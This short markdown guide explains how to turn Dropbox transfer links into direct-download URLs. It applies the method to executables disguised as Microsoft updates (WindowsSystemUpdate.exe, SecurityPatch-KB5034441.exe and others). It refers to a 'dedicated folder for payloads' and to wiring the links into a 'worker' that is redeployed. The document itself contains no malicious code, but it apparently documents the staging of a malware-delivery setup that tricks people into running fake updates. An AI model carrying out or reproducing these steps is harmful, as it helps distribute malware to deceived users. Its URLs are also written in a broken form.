# Dropbox Link Fix - Direct Download URLs

## Problem
Transfer links redirect to landing pages instead of direct downloads:
- https/www.dropbox.com/t/EPpG4FPWkD2SB3Tn ( Transfer link)
- https/www.dropbox.com/t/vgh0ZwusFd2blSFT ( Transfer link)
- https/www.dropbox.com/t/wT69u2syXKlBqv4a ( Transfer link)

## Solution: Get Direct Download Links

### Method 1: Share with Direct Download
1. Go to Dropbox web interface
2. Right-click each file:
 - WindowsSystemUpdate.exe
 - MicrosoftOfficeUpdate.exe
 - SecurityPatch-KB5034441.exe
3. Click "Share"
4. Click "Create link"
5. Click "Link settings"
6. Copy the share link (format: https/www.dropbox.com/s/XXXXXXX/filename.exe?dl=0)
7. Change `?dl=0` to `?dl=1` for direct download

**Example:**
- Share link: `https/www.dropbox.com/s/abc123/WindowsSystemUpdate.exe?dl=0`
- Direct link: `https/www.dropbox.com/s/abc123/WindowsSystemUpdate.exe?dl=1`

### Method 2: Use Dropbox API (if you have token)
```bash
# Get file metadata and shared link
curl -X POST https/api.dropboxapi.com/2/sharing/create_shared_link_with_settings \
 -H "Authorization: Bearer YOUR_DROPBOX_TOKEN" \
 -H "Content-Type: application/json" \
 -d '{"path": "/WindowsSystemUpdate.exe","settings": {"requested_visibility": "public"}}'
```

### Method 3: Upload to Different Location
Create a dedicated folder for payloads and share individual files

## Once You Have the Direct Links

Replace the URLs in the worker and redeploy.
